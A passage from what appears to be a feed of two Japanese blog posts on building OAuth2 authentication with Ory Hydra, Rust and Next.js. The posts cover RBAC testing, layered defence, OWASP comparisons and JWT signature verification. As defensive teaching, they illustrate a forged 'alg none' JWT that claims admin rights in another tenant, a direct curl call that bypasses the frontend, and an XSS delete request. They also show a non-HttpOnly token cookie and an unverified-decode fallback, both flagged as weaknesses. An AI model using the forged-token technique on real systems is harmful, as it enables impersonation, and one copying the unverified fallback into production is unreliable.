http://localhost:3001/callback?code=ory_ac_d9jRSkWUb1YXm...4. Token Exchange...   Access Token: ory_at_dxBjsXjmRvMuTcSJercIxT_Kq2nUIR6OrUhdBEcEZIg...5. Testing API Endpoints...   Engineers Count: 36. Backend Verification:   slug_from_header=Some(\\"test-shop\\")   Hydra token introspection successful: sub=Some(\\"3767fa6a-...\\")============================================   E2E Test PASSED - All fixes verified!============================================複数アカウントでのRBAC検証E2Eテストの最後に、異なるロールのアカウントでログインして、役割ベースアクセス制御（RBAC）が正しく機能しているかを検証した。テスト結果のサマリー以下は修正前のテスト結果だ。platform_adminがDashboardで403を返すなど、明らかな異常がある。詳細は後述する。 アカウント  ロール  ナビゲーションメニュー  アクセス可能ページ  demo@example.com  platform_admin  全メニュー  Dashboard(403)、その他未テスト  manager@example.com  manager  全メニュー  Dashboard, Incidents, Projects, Engineers, Recruitment, Leaderboard  sato@example.com  engineer  制限メニュー  Dashboard, Incidents, Projects, Leaderboard  reporter@example.com  reporter  制限メニュー  すべてAccess Denied 発見1：フロントエンドとバックエンドのデータ不一致テストアカウント一覧を表示するフロントエンドのホームページには、こう書いてあった：Reporter | customer@example.com | Report incidents onlyしかし実際にcustomer@example.comでログインすると、ヘッダーにはengineerと表示された。データベースとフロントエンドの表示が不一致だった。正しいReporterアカウントはreporter@example.comだった。発見2：ロールごとのメニュー制御Playwright MCPのARIAスナップショットで、ロールごとのナビゲーションメニューの違いを確認できた。Manager（manager@example.com）のメニュー：- link \\"Dashboard\\" [ref=e10]- link \\"Incidents\\" [ref=e11]- link \\"Projects\\" [ref=e12]- link \\"Engineers\\" [ref=e13]- link \\"Recruitment\\" [ref=e14]- link \\"Leaderboard\\" [ref=e15]Engineer（sato@example.com）のメニュー：- link \\"Dashboard\\" [ref=e10]- link \\"Incidents\\" [ref=e11]- link \\"Projects\\" [ref=e12]- link \\"Leaderboard\\" [ref=e13]# Engineers, Recruitmentが表示されない発見3：Reporterの「何もできない」状態reporter@example.comでログインして各ページにアクセスすると、すべて「Access Denied」が表示された。CLAUDE.mdによると、Reporterは「Report incidents only」という説明だったが、実際にはインシデントページすら見られない。これは設計ミスだった。修正が必要だ。フロントエンドとバックエンドの権限制御問題の根本原因Reporterロールがすべてのページでアクセス拒否されていた原因は、Next.jsのmiddleware.tsにあった：// 修正前：ReporterはADMIN_PATHSに含まれていないconst ADMIN_PATHS = [\\"/dashboard\\", \\"/incidents\\", \\"/projects\\", \\"/engineers\\", \\"/recruitment\\", \\"/leaderboard\\"];// ロールチェック：platform_admin, manager, engineerのみ許可if (isAdminPath && ![\\"platform_admin\\", \\"manager\\", \\"engineer\\"].includes(role)) {  return NextResponse.redirect(new URL(\\"/?error=unauthorized\\", request.url));}修正内容// 修正後：ADMIN_PATHSから/incidentsを分離し、REPORTER_PATHSを新設const ADMIN_PATHS = [\\"/dashboard\\", \\"/projects\\", \\"/engineers\\", \\"/recruitment\\", \\"/leaderboard\\"];const REPORTER_PATHS = [\\"/incidents\\"];  // Reporter専用パス// Reporter paths - reporter, engineer, manager, platform_admin can accessconst isReporterPath = REPORTER_PATHS.some((p) => pathname.startsWith(p));if (isReporterPath && ![\\"platform_admin\\", \\"manager\\", \\"engineer\\", \\"reporter\\"].includes(role)) {  return NextResponse.redirect(new URL(\\"/?error=unauthorized\\", request.url));}// Admin paths - platform_admin, manager, engineer can access (not reporter)const isAdminPath = ADMIN_PATHS.some((p) => pathname.startsWith(p));if (isAdminPath && ![\\"platform_admin\\", \\"manager\\", \\"engineer\\"].includes(role)) {  return NextResponse.redirect(new URL(\\"/?error=unauthorized\\", request.url));}これで権限階層が明確になった： パス  platform_admin  manager  engineer  reporter  /tenants  ✅  ❌  ❌  ❌  /dashboard  ✅  ✅  ✅  ❌  /incidents  ✅  ✅  ✅  ✅  /projects  ✅  ✅  ✅  ❌ 多層防御の実装「フロントエンドで権限チェックすればいい」という意見と、「バックエンドだけでやるべき」という意見がある。どちらも正しく、どちらも不十分だ。フロントエンドだけでは、攻撃者がcurlで直接APIを叩けば突破される。バックエンドだけでは、権限のないユーザーが画面を見てから「アクセス拒否」されるUXになる。答えは「両方やる」——多層防御と呼ばれる考え方だ。城の防壁が一重ではなく多重であるように、セキュリティも複数のレイヤーで守る。フロントエンドのmiddleware.tsだけでは不十分だ。攻撃者はフロントエンドを完全にバイパスできる：# フロントエンドを経由せずにAPIを直接叩けるcurl -s http://localhost:3000/api/v1/tenant/incidents \\\\  -H \\"Authorization: Bearer $TOKEN\\" \\\\  -H \\"X-Tenant-Slug: test-shop\\"Rustバックエンド（Axum）では、権限制御が複数のレイヤーで行われている：レイヤー1：require_auth（認証） - トークンが有効かどうかをチェックレイヤー2：extract_tenant（テナント抽出） - X-Tenant-Slugヘッダーからテナントを特定レイヤー3：ハンドラー内のロールチェック - 特定の操作でロールをチェックpub async fn assign_incident(/* ... */) -> Result<Json<IncidentWithStatus>, AppError> {    let role = claims.get_role();    if !role.can_manage_team() {        return Err(AppError::Forbidden(            \\"Only managers can assign incidents\\".to_string(),        ));    }    // ...}多層防御が正解だ： レイヤー  役割  目的  フロントエンド middleware  早期リダイレクト  UX向上、不要なリクエスト削減  バックエンド require_auth  認証チェック  不正アクセス防止  バックエンド ハンドラー  操作ごとの認可  きめ細かい権限制御 ベストプラクティスとの比較この実装が業界のベストプラクティスにどれだけ準拠しているかを評価する。OWASP Top 10 2025との比較OWASP Top 10 2025でBroken Access Controlが1位を維持している。 OWASP推奨事項  準拠状況  実装詳細  サーバーサイドでのアクセス制御  ✅ 準拠  Axumミドルウェアで全APIを保護  デフォルト拒否  ✅ 準拠  未認証リクエストは全て拒否  アクセス制御の再利用  ✅ 準拠  require_authを全ルートで共有  レコード所有権の検証  ⚠️ 部分的  テナント分離は実装、リソース単位は未実装  アクセス制御失敗のログ  ⚠️ 部分的  tracingでログ出力、アラートは未実装  レート制限  ❌ 未実装  APIにレート制限なし  JWTの不正利用防止  ✅ 準拠  Hydraによるトークン検証  セキュリティヘッダ  ⚠️ 部分的  HSTS, X-Frame-Options, X-Content-Type-Optionsの設定が必要  入力値バリデーション  ✅ 準拠  サーバーサイドでバリデーション実施 Next.jsセキュリティガイドラインとの比較Next.js Authentication Guideは、認証に関する重要な警告を含んでいる。 Next.js推奨事項  準拠状況  実装詳細  Middlewareだけに依存しない  ✅ 準拠  バックエンドでも認証チェック  Data Access Layer (DAL)の使用  ⚠️ 部分的  サービス層で分離、専用DALなし  HttpOnly Cookieの使用  ⚠️ 部分的  auth_tokenは非HttpOnly Next.jsチームは「middlewareは認証に安全ではない」と警告している。この多層防御は、CVE-2025-29927のようなmiddlewareバイパス脆弱性への対策にもなる。RBACパターンとの比較 RBACベストプラクティス  準拠状況  実装詳細  バックエンドでのポリシー強制  ✅ 準拠  ハンドラー内でロールチェック  フロントエンドはUI適応のみ  ✅ 準拠  メニュー表示/非表示で対応  権限キャッシュ  ❌ 未実装  毎リクエストでHydra呼び出し  中央集権的ポリシー管理  ⚠️ 部分的  定義は分散している  ロール階層の明確化  ✅ 準拠  4段階のロール階層を定義 総合評価 評価軸  スコア  コメント  OWASP Top 10 2025  7/10  基本的なアクセス制御は準拠、レート制限が不足  Next.js Security  8/10  多層防御を実装、HttpOnly Cookieが部分的  RBAC Patterns  7/10  フロントエンド/バックエンド分離は適切、権限定義が分散 強み：多層防御の実装：フロントエンド + バックエンド + ハンドラーの3層テナント分離：PostgreSQLスキーマレベルでのデータ分離OAuth2標準準拠：Ory Hydraによる標準的なOAuth2/OIDC実装トークン検証の二重化：自前JWT + Hydraイントロスペクションのフォールバック弱み：正直に言えば、見落としがあるかもしれない。セキュリティの評価は、「問題がない」ことを証明できない。見つかっていないだけかもしれない。だから、この記事を読んで「これで完璧だ」と思わないでほしい。OWASP Top 10のチェックリストを自分で回して、この記事で触れていない項目を確認してほしい。それを前提に、現時点で認識している弱みを列挙する。レート制限なし：DoS攻撃への脆弱性権限定義の分散：フロントエンドとバックエンドで定義が重複権限キャッシュなし：毎リクエストでHydraに問い合わせ監査ログの不足：アクセス制御失敗のアラート機能なし改善ロードマップ優先度順に改善すべき項目： 優先度  項目  工数  効果  高  レート制限の追加  小  DoS防止、OWASP準拠  高  監査ログとアラート  中  インシデント検出  高  セキュリティヘッダの追加  小  HSTS, X-Frame-Options, X-Content-Type-Options  中  権限定義の一元化  中  保守性向上  中  権限キャッシュ（Redis）  中  パフォーマンス向上  中  Cookie Prefix（__Host-）の導入  小  Cookie属性の強制  低  PKCE導入  小  認可コード横取り防止  低  HttpOnly Cookie化  中  XSS対策強化 // 改善案：tower-governor等でレート制限を追加use tower_governor::{governor::GovernorConfigBuilder, GovernorLayer};let governor_conf = GovernorConfigBuilder::default()    .per_second(10)    .burst_size(50)    .finish()?;let app = Router::new()    // ...    .layer(GovernorLayer { config: governor_conf });まとめOAuth2 + マルチテナントの認証システム実装を通じて学んだこと「動く」と「正しく動く」は違う：ログインできても、APIが動くとは限らない。APIが動いても、全ロールで正しく動くとは限らない。全ロールで動いても、攻撃に耐えるとは限らない。5つのバグすべてが、「ログインできた」の後に発見されたE2Eテストは必須：すべてユニットテストでは発見できなかった多層防御が重要：フロントエンドだけ、バックエンドだけでは不十分全ロールで検証する：「ログインできた」だけでは不十分ベストプラクティスとのギャップを把握する：何ができていて、何が不足しているかを明確にする認証は地味だが重要だ。インシデント対応のように緊張感もないし、新機能開発のような達成感もない。でも、認証が崩れたときの被害は、他のどの機能障害よりも大きい。過去に見た事例では、セッション管理の不備で全ユーザーのデータが漏洩した。復旧に数ヶ月、信頼回復に1年以上かかった。地味なものほど、丁寧にやる。例えば、この記事で示したE2Eテスト、全ロールでの検証、ベストプラクティスとの比較を、リリース前に必ず行う。それがインフラを支える人間の流儀だ。派手な仕事は誰でも丁寧にやる。地味な仕事を丁寧にやれるかどうかが、プロとアマチュアの違いだと思っている。「ログインできる」は最低条件であり、「安全にログインできる」「快適にログインできる」「問題が起きたときに追跡できる」まで含めて、初めて「認証が実装できた」と言える。この認証実装は完成ではなく、継続的に改善していく起点だ。半年後、1年後に見直したとき、「あの時の判断は正しかったか」を検証できるように、今回の記事を残しておく。次回予告ここまでの4記事で、OAuth2認可サーバー（Hydra）+ 自前認証プロバイダー（Rust）+ フロントエンド（Next.js）の構成が完成した。E2Eテストも通り、RBACも検証できた。しかし、レビューコメントが届いた。「パスワードリセット機能は？」「MFA対応の予定は？」全部、自分で実装するのか？——次回は、Ory Kratosを導入して認証機能を委譲する方法を解説する。参考資料E2EテストPlaywright MCP - LLMがブラウザを操作するためのMCPサーバーModel Context Protocol (MCP) - LLMと外部ツールを接続するプロトコルOry HydraOry Hydra Documentation - Ory Hydra公式ドキュメントToken Introspection - トークンイントロスペクションAPILogin Flow - ログインフローの概念Consent Flow - 同意フローの概念OAuth2 Token Endpoint - トークンエンドポイントAPIリファレンスOAuth2 Revoke Token - トークン失効APIJWKS Endpoint - 公開鍵配信エンドポイントセキュリティガイドラインOWASP Top 10 2025 - Broken Access Control - アクセス制御の脆弱性OWASP Authorization Cheat Sheet - 認可チートシートOWASP Access Control Cheat Sheet - アクセス制御チートシートOWASP OAuth2 Cheat Sheet - OAuth2セキュリティチートシートAuth0 Token Storage - トークンストレージのベストプラクティスRFC 9700 - OAuth 2.0 Security Best Current Practice - OAuth2セキュリティBCPRBACOso: RBAC Role Based Access ControlLogRocket: Choosing the best access control model for frontendLeapcell: Implementing Robust RBAC Across Backend FrameworksNext.jsNext.js Authentication GuideNext.js MiddlewareCORSMDN: Cross-Origin Resource Sharing (CORS)tower-http CorsLayer","isoDate":"2026-01-10T21:43:11.000Z","dateMiliSeconds":1768081391000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Next.jsでOry Hydra認証を実装する ― マルチテナントSaaSでの実践","link":"https://syu-m-5151.hatenablog.com/entry/2026/01/09/104616","contentSnippet":"はじめに前回の記事では、RustでOry HydraのLogin/Consent Providerを実装した。5つのエンドポイント（GET/POST /login、GET/POST /consent、GET /logout）とHydra Admin APIの連携。Argon2idによるパスワードハッシュ、ユーザー列挙攻撃を防ぐテスト設計の話をした。前提知識: この記事は前回の記事の続編です。OAuth2認可コードフローの基礎知識と、Ory HydraのLogin/Consent Providerの役割を理解している前提で進めます。syu-m-5151.hatenablog.com今回は、そのバックエンドと連携するフロントエンドをNext.js 15で実装する。なぜフロントエンドも自分で書くのか。認証フローを端から端まで把握しておきたいからだ。ちなみにフロントエンドは専門外なのである程度は許してほしいです。NextAuth.jsやAuth0のSDKを使えば楽だが、ブラックボックスのまま本番に出すのは怖い。何かが壊れたとき、「ライブラリの中で何が起きているかわからない」では障害対応で詰むことがある。もちろん、最終的なゴールは「理解した上でライブラリを使う」ことだ。車輪の再発明を推奨しているわけではない。OAuth2/OIDCフローをブラウザ側でどう扱うか。Cookie管理の罠。マルチテナント環境での認証の複雑さ。実際に動かして気づいたことを記録する。OAuth2認可コードフロー：フロントエンドから見た流れまず全体像を把握しておく。┌─────────────┐     ┌─────────────┐     ┌─────────────┐     ┌─────────────┐│   Browser   │     │   Next.js   │     │ Rust Backend│     │  Ory Hydra  ││  (User)     │     │  Frontend   │     │ (Provider)  │     │  (OAuth2)   │└──────┬──────┘     └──────┬──────┘     └──────┬──────┘     └──────┬──────┘       │                   │                   │                   │       │ 1. Login Click    │                   │                   │       │──────────────────>│                   │                   │       │                   │                   │                   │       │ 2. Redirect to    │                   │                   │       │    /oauth2/auth   │                   │                   │       │<──────────────────│                   │                   │       │                   │                   │                   │       │ 3. GET /oauth2/auth?client_id=...    │                   │       │──────────────────────────────────────────────────────────>│       │                   │                   │                   │       │ 4. Redirect to /login?login_challenge=xxx                 │       │<──────────────────────────────────────────────────────────│       │                   │                   │                   │       │ 5. GET /login                         │                   │       │──────────────────────────────────────>│                   │       │                   │                   │                   │       │ 6. Login Form     │                   │                   │       │<──────────────────────────────────────│                   │       │                   │                   │                   │       │ 7. POST /login (credentials)          │                   │       │──────────────────────────────────────>│                   │       │                   │                   │                   │       │                   │                   │ 8. Accept Login   │       │                   │                   │──────────────────>│       │                   │                   │                   │       │ 9. Redirect to /consent               │                   │       │<──────────────────────────────────────│                   │       │                   │                   │                   │       │ ... Consent Flow ...                  │                   │       │                   │                   │                   │       │ 10. Redirect to /callback?code=xxx    │                   │       │<──────────────────────────────────────────────────────────│       │                   │                   │                   │       │ 11. GET /callback │                   │                   │       │──────────────────>│                   │                   │       │                   │                   │                   │       │                   │ 12. Exchange code for tokens          │       │                   │──────────────────────────────────────>│       │                   │                   │                   │       │                   │ 13. Tokens (access, id, refresh)      │       │                   │<──────────────────────────────────────│       │                   │                   │                   │       │ 14. Set Cookie &  │                   │                   │       │     Redirect      │                   │                   │       │<──────────────────│                   │                   │このフローで重要なのは、フロントエンドは認証ロジックを持たないということだ。なぜか。フロントエンドのコードはユーザーのブラウザで動く。攻撃者は自由に改変できる。DevToolsを開けばJavaScriptは丸見えだし、リクエストも書き換えられる。認証ロジックをそこに置くということは、攻撃者に「好きに改ざんしていいですよ」と言っているようなものだ。認証情報の検証はすべてRustバックエンド（Login Provider）で行う。フロントエンドの役割は：認可エンドポイントへのリダイレクト開始コールバックで認可コードを受け取る認可コードをトークンに交換トークンをCookieに保存以降のAPI呼び出しでトークンを使用Next.js App Routerでの実装ディレクトリ構成frontend/src/├── app/│   ├── layout.tsx│   ├── page.tsx                    # ランディング│   ├── dashboard/page.tsx          # 認証後のダッシュボード│   ├── callback/page.tsx           # OAuth2コールバック│   └── api/auth/│       ├── login/route.ts          # ログイン開始│       ├── callback/route.ts       # コールバック処理│       └── logout/route.ts         # ログアウト├── components/│   └── shared/│       └── Header.tsx├── lib/│   └── api.ts                      # APIクライアント└── middleware.ts                   # 認証チェックログイン開始：認可エンドポイントへのリダイレクト// app/api/auth/login/route.tsimport { NextResponse } from \\"next/server\\";import crypto from \\"crypto\\";export async function GET(request: Request) {  const { searchParams } = new URL(request.url);  const returnTo = searchParams.get(\\"returnTo\\") || \\"/dashboard\\";  // CSRF対策用のstate生成  const state = crypto.randomBytes(16).toString(\\"hex\\");  // stateにリダイレクト先を含める（Base64エンコード）  const stateWithReturn = `${state}:${Buffer.from(returnTo).toString(\\"base64\\")}`;  // Hydra認可エンドポイントへのURL構築  const params = new URLSearchParams({    client_id: process.env.OAUTH_CLIENT_ID!,    response_type: \\"code\\",    scope: \\"openid profile email\\",    redirect_uri: `${process.env.NEXT_PUBLIC_URL}/callback`,    state: stateWithReturn,  });  const authUrl = `${process.env.HYDRA_PUBLIC_URL}/oauth2/auth?${params}`;  return NextResponse.redirect(authUrl);}stateパラメータは2つの役割を持つ：CSRF対策：ランダムな値を含めることで、攻撃者が生成したURLでのコールバックを防ぐリダイレクト先の保持：認証後、元のページへ戻るためにreturnToをエンコードして含めるRFC 9700 (OAuth 2.0 Security Best Current Practice)では、stateパラメータによるCSRF対策が明記されている。認可サーバーがPKCEをサポートしていることを確認できるなら、PKCEでCSRF対策を兼ねることも可能だが、stateを使う方法が最も広くサポートされている。cheatsheetseries.owasp.orgコールバック処理：トークン取得とCookie設定ここが最も複雑な部分だ。// app/api/auth/callback/route.tsimport { NextResponse } from \\"next/server\\";export async function POST(request: Request) {  const body = await request.json();  const { code, state } = body;  // stateからリダイレクト先を取り出す  const [, returnToBase64] = state.split(\\":\\");  const returnTo = Buffer.from(returnToBase64, \\"base64\\").toString();  // 認可コードをトークンに交換  const tokenResponse = await fetch(    `${process.env.HYDRA_PUBLIC_URL}/oauth2/token`,    {      method: \\"POST\\",      headers: {        \\"Content-Type\\": \\"application/x-www-form-urlencoded\\",        Authorization: `Basic ${Buffer.from(          `${process.env.OAUTH_CLIENT_ID}:${process.env.OAUTH_CLIENT_SECRET}`        ).toString(\\"base64\\")}`,      },      body: new URLSearchParams({        grant_type: \\"authorization_code\\",        code,        redirect_uri: `${process.env.NEXT_PUBLIC_URL}/callback`,      }),    }  );  if (!tokenResponse.ok) {    const error = await tokenResponse.text();    console.error(\\"Token exchange failed:\\", error);    return NextResponse.json(      { error: \\"Token exchange failed\\" },      { status: 401 }    );  }  const tokens = await tokenResponse.json();  // IDトークンをデコードしてユーザー情報を取得  const idTokenPayload = JSON.parse(    Buffer.from(tokens.id_token.split(\\".\\")[1], \\"base64\\").toString()  );  console.log(\\"ID token decoded:\\", idTokenPayload);  // レスポンスにCookieを設定  const response = NextResponse.json({ success: true, returnTo });  response.cookies.set(\\"auth_token\\", tokens.access_token, {    httpOnly: false,  // クライアントJSからアクセス可能に    secure: process.env.NODE_ENV === \\"production\\",    sameSite: \\"lax\\",    maxAge: tokens.expires_in,    path: \\"/\\",  });  if (tokens.refresh_token) {    response.cookies.set(\\"refresh_token\\", tokens.refresh_token, {      httpOnly: true,  // リフレッシュトークンはhttpOnlyで保護      secure: process.env.NODE_ENV === \\"production\\",      sameSite: \\"lax\\",      maxAge: 30 * 24 * 60 * 60, // 30日      path: \\"/\\",    });  }  return response;}Cookie設定で学んだこと最初、httpOnly: trueでアクセストークンを設定していた。OWASPのセッション管理チートシートによれば、これがセキュリティのベストプラクティスだ。しかし、クライアントサイドでAPIを呼び出す必要があった。owasp.org// クライアントコンポーネントでAPIを呼び出すuseEffect(() => {  const token = document.cookie    .split(\\"; \\")    .find((row) => row.startsWith(\\"auth_token=\\"))    ?.split(\\"=\\")[1];  if (token) {    api.setToken(token);  }}, []);httpOnly: trueだとdocument.cookieからアクセスできない。選択肢は2つ：アクセストークンをhttpOnly: falseにする - クライアントJSからアクセス可能Server Componentからのみ API を呼ぶ - httpOnlyのまま、サーバーサイドで処理今回は1を選んだ。「httpOnlyをfalseにするなんて、セキュリティの教科書に反している」——そう思う人がいるかもしれない。私もそう思った。OWASPのチートシートにも「httpOnly: trueにしろ」と書いてある。でも、教科書に書いてあることと、目の前のシステムで最善の選択は、必ずしも一致しない。この判断には明確な理由がある。まず、脅威モデルを整理する。httpOnlyの目的は「XSSでトークンを盗まれること」を防ぐことだ。では、XSSが成功した場合に何が起きるか。攻撃者はユーザーのブラウザ上で任意のJavaScriptを実行できる。httpOnlyでトークンを保護しても、攻撃者はfetch(\'/api/user/delete\', {credentials: \'include\'})を実行できる。トークンを「盗む」ことはできなくても、「使う」ことはできる。しかし、httpOnly: falseにすることで追加のリスクが生じる。トークンを読み取って攻撃者のサーバーに送信できるため、攻撃者は別のマシンからトークンを使用できる。httpOnly: trueなら被害はそのブラウザセッション内に限定されるが、falseなら攻撃者が任意の場所からAPIを叩ける。つまり、httpOnlyは「トークンの窃取」を防ぐことで、XSS被害の範囲を限定する。しかし、XSS対策の本質は、そもそもXSSを発生させないことだ。CSP（Content Security Policy）、入力のサニタイズ、Reactの自動エスケープ——これらがXSS対策の本丸であり、httpOnlyは最後の砦にすぎない。その上で、今回の判断基準は以下だ。アクセストークンは短命（15分）: 仮に窃取されても、15分で無効化されるリフレッシュトークンはhttpOnly: trueで保護: 長期間有効なトークンは絶対に保護するクライアントサイドでのAPI呼び出しが必須: Server Componentだけでは実現できないリアルタイム機能があるしかし、これはトレードオフだ。Auth0のToken Storageガイドでは、SPAの場合、インメモリストレージが最も安全とされている。将来的にはBFF（Backend for Frontend）パターンに移行し、トークンをサーバーサイドで完全に管理する構成を検討している。Curity社のベストプラクティス記事では、JWTの安全な取り扱いについて詳しく解説されている。owasp.orgID Tokenの署名検証なぜ署名検証が必要か最初の実装では、ID Tokenを単純にBase64デコードしていた：// ❌ 危険：署名検証なしのデコードconst payload = JSON.parse(  Buffer.from(tokens.id_token.split(\\".\\")[1], \\"base64\\").toString());これは動く。中身も読める。でも、これでは改ざんを検出できない。「tokenエンドポイントから直接取得しているから、改ざんされることはないのでは？」と思うかもしれない。確かに、バックエンドでtokenエンドポイントを呼び出し、その結果をそのまま使うなら、経路上で改ざんされるリスクは低い。しかし、問題は別のところにある。フロントエンドにトークンを渡す設計だと、ブラウザ側で別のトークンに差し替えられる可能性がある。また、マイクロサービス間でトークンを渡す際、悪意あるサービスが偽トークンを送る可能性もある。署名検証は「このトークンは本当にHydraが発行したものか」を確認する仕組みだ。具体的に何が起きるか。攻撃者は以下のようなトークンを作成できる。// 攻撃者が作成した偽のトークンconst fakePayload = {  sub: \\"admin-user-id\\",  // 管理者のユーザーID  email: \\"admin@example.com\\",  role: \\"platform_admin\\",  // 権限昇格  tenant_id: \\"target-tenant\\",  // 他テナントへのアクセス  exp: 9999999999  // 無期限};const fakeToken = `eyJhbGciOiJub25lIn0.${btoa(JSON.stringify(fakePayload))}.`;署名検証をしていなければ、このトークンは「有効」として受け入れられる。攻撃者は任意のユーザーになりすまし、任意の権限を持ち、任意のテナントにアクセスできる。認証システムが完全に無意味になる。JWTは3つのパートで構成される：ヘッダー.ペイロード.署名。署名を検証しないということは、攻撃者が作った偽のトークンも受け入れてしまうということだ。これは「鍵のかかっていない金庫」と同じだ。中身は入っているが、誰でも開けられる。OpenID Connect Core 1.0のID Token検証仕様では、以下の検証が必須とされている：署名アルゴリズムの確認（alg）発行者の検証（iss = Hydra URL）対象者の検証（aud = クライアントID）有効期限の確認（exp）署名の検証（公開鍵で）joseライブラリによる実装joseライブラリを使うと、これらの検証を簡潔に実装できる。npm install jose// lib/auth.tsimport * as jose from \\"jose\\";export interface IdTokenClaims {  sub: string;  aud: string | string[];  iss: string;  exp: number;  iat: number;  email?: string;  role?: string;  tenant_id?: string;}/** * ID Tokenの署名を検証し、クレームを返す * @see https://openid.net/specs/openid-connect-core-1_0.html#IDTokenValidation */export async function verifyIdToken(idToken: string): Promise<IdTokenClaims> {  const hydraUrl = process.env.HYDRA_PUBLIC_URL || \\"http://localhost:4444\\";  const clientId = process.env.NEXT_PUBLIC_CLIENT_ID || \\"demo-client\\";  // JWKSエンドポイントから公開鍵を取得  // @see https://www.ory.sh/docs/hydra/reference/api#tag/jwk/operation/discoverJsonWebKeys  const JWKS = jose.createRemoteJWKSet(    new URL(`${hydraUrl}/.well-known/jwks.json`)  );  // 署名検証 + issuer/audience検証  const { payload } = await jose.jwtVerify(idToken, JWKS, {    issuer: hydraUrl,    audience: clientId,  });  return payload as IdTokenClaims;}コールバックでの使用// app/api/auth/callback/route.tsimport { verifyIdToken } from \\"@/lib/auth\\";export async function POST(request: Request) {  const { code } = await request.json();  // トークン交換...  const tokens = await exchangeCodeForTokens(code);  // ✅ 署名検証付きでID Tokenをデコード  try {    const claims = await verifyIdToken(tokens.id_token);    console.log(\\"ID token verified:\\", {      sub: claims.sub,      email: claims.email,      role: claims.role,      iss: claims.iss,    });    // ユーザー情報をセッションに保存    const user = {      id: claims.sub,      email: claims.email || \\"unknown\\",      role: claims.role || \\"customer\\",      tenant_id: claims.tenant_id,    };    // Cookie設定...  } catch (error) {    console.error(\\"ID token verification failed:\\", error);    return NextResponse.json(      { error: \\"Token verification failed\\" },      { status: 401 }    );  }}E2Eテストでの確認実際にログインフローを実行して、署名検証が機能していることを確認した。verifyIdToken()の内部ログと、コールバックハンドラーのログが出力される：ID token verified successfully: {  sub: \'c128f3e7-5013-46b8-add2-fbe0e78bfec7\',  email: \'demo@example.com\',  role: \'platform_admin\',  iss: \'http://localhost:4444\'}ID token verified and decoded: {  sub: \'c128f3e7-5013-46b8-add2-fbe0e78bfec7\',  email: \'demo@example.com\',  role: \'platform_admin\',  tenant_id: undefined,  iss: \'http://localhost:4444\',  aud: [ \'demo-client\' ]}POST /api/auth/callback 200 in 609msverified successfullyと出力されれば、以下が確認できている：JWKSエンドポイント（/.well-known/jwks.json）から公開鍵を取得できた署名が正しく検証された（RS256）issがHydra URL（http://localhost:4444）と一致したaudにクライアントID（demo-client）が含まれていたトークンが有効期限内だったtenant_id: undefinedは、Platform Adminユーザーがテナントに所属していないため。通常のテナントユーザーでログインすると、ここにテナントIDが表示される。開発環境でのフォールバック開発環境ではJWKSエンドポイントにアクセスできない場合がある。その時は警告を出しつつ、署名なしデコードにフォールバックする：try {  const claims = await verifyIdToken(tokens.id_token);  // 検証成功} catch (verifyError) {  console.warn(\\"ID token verification failed, falling back to unsafe decode\\");  console.warn(\\"WARNING: Using unverified ID token claims. This is insecure!\\");  // 開発環境のみ許容  const unsafeClaims = decodeIdTokenUnsafe(tokens.id_token);  // ...}本番環境では、このフォールバックを無効化すべきだ。github.comマルチテナント認証JWTにテナント情報を含めるOry HydraのConsent画面で、ユーザーのテナント情報をIDトークンに含める。ベストプラクティスとして、Login時にcontextに保存したユーザー情報をConsent時に取得する（DBルックアップを回避）：// Rustバックエンド側（Consent Provider）// Best Practice: contextからユーザー情報を取得（DBルックアップ不要）// Login時にUserContextとして保存した情報をここで復元let user_context: Option<UserContext> = consent_request    .context    .as_ref()    .and_then(|ctx| serde_json::from_value(ctx.clone()).ok());let (user_email, user_role, user_tenant_id) = user_context    .map(|ctx| (ctx.email, ctx.role, ctx.tenant_id))    .unwrap_or_default();// IDトークンにカスタムクレームを追加let session = ConsentSession {    id_token: serde_json::json!({        \\"email\\": user_email,        \\"role\\": user_role,        \\"tenant_id\\": user_tenant_id,  // テナントIDを含める    }),};hydra.accept_consent(&challenge, grant_scope, grant_audience, Some(session)).await?;ここで重要なのは、user_emailやuser_roleをDBから取得するのではなく、Login時にHydraのcontextに保存したUserContextから取得している点だ。これにより：Consent時のDBアクセスが不要になるLogin時点のユーザー状態が保持される（整合性）パフォーマンスが向上するフロントエンドでトークンをデコードすると、テナント情報が取得できる：// IDトークンのペイロード例{  \\"aud\\": [\\"demo-client\\"],  \\"email\\": \\"manager@example.com\\",  \\"role\\": \\"manager\\",  \\"tenant_id\\": \\"aa8d56f1-a083-439b-996a-4a7b73698dfb\\",  \\"sub\\": \\"e5555555-5555-5555-5555-555555555555\\"}APIリクエストでのテナント分離バックエンドAPIは/api/v1/tenant/というプレフィックスでテナント固有のエンドポイントを提供：/api/v1/tenant/incidents    # テナント内のインシデント/api/v1/tenant/projects     # テナント内のプロジェクト/api/v1/tenant/engineers    # テナント内のエンジニアテナントIDはJWTから取得するため、URLにテナントIDを含める必要はない。これにより：URLの推測による他テナントへのアクセス試行を防ぐテナントIDの改ざんを防ぐ（JWTは署名で保護されている）なぜURLパスにテナントIDを含める方式が危険なのか、具体例で説明する。# URLパス方式（危険）GET /api/v1/tenants/tenant-123/incidentsGET /api/v1/tenants/tenant-456/incidents  ← tenant-123のユーザーがアクセスを試みるこの方式では、バックエンドで「リクエストしたユーザーがtenant-456に所属しているか」を毎回検証する必要がある。検証を忘れると、他テナントのデータが漏洩する。実際、この種のバグは「IDOR（Insecure Direct Object Reference）」として知られ、OWASPのトップ10に常に入る脆弱性だ。# JWTクレーム方式（安全）GET /api/v1/tenant/incidents# JWTの中身: {\\"tenant_id\\": \\"tenant-123\\", ...}この方式では、バックエンドはJWTからテナントIDを取得する。JWTは署名で保護されているため、ユーザーが改ざんできない。「どのテナントのデータを返すか」はJWTが決定し、URLは関与しない。URLパラメータとユーザー権限を照合する追加の検証が不要になるため、バグの入り込む余地が減る。このアプローチはMicrosoft Azure Architecture Centerでも推奨されている。ログアウト処理OAuth2のログアウトは複雑だ。以下を考慮する必要がある：フロントエンドのCookie削除HydraのOAuth2セッション無効化バックエンドのセッション無効化（該当する場合）// app/api/auth/logout/route.tsexport async function GET(request: Request) {  const accessToken = request.cookies.get(\\"auth_token\\")?.value;  if (accessToken) {    // 1. Hydraでトークンを無効化    await fetch(`${process.env.HYDRA_PUBLIC_URL}/oauth2/revoke`, {      method: \\"POST\\",      headers: {        \\"Content-Type\\": \\"application/x-www-form-urlencoded\\",        Authorization: `Basic ${Buffer.from(          `${process.env.OAUTH_CLIENT_ID}:${process.env.OAUTH_CLIENT_SECRET}`        ).toString(\\"base64\\")}`,      },      body: new URLSearchParams({        token: accessToken,      }),    });    // 2. Hydraのログインセッションも削除    // 